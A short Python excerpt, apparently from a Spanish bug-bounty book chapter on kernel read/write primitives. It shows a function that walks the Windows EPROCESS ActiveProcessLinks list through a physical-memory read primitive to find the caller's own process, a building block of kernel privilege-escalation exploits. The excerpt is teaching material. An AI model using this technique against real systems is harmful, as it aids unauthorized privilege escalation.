# Extraído de: LibroBugBounty/cap-11-kernel-rw.md
def find_our_eprocess(phys_memory, system_eprocess_phys, our_pid):
    """Recorre ActiveProcessLinks hasta encontrar nuestro proceso."""
    current_virt = phys_memory.read_qword(
        system_eprocess_phys + OFFSET_ACTIVE_LINKS
    )
    visited = set()
    while current_virt not in visited:
        visited.add(current_virt)
        # Convertir dirección virtual a física
        # (requiere resolver tablas de páginas o usar otra primitiva)
        eprocess_phys = virt_to_phys(current_virt - OFFSET_ACTIVE_LINKS)
        pid = phys_memory.read_qword(eprocess_phys + OFFSET_PID)
        if pid == our_pid:
            return eprocess_phys
        current_virt = phys_memory.read_qword(
            eprocess_phys + OFFSET_ACTIVE_LINKS
        )
    return None
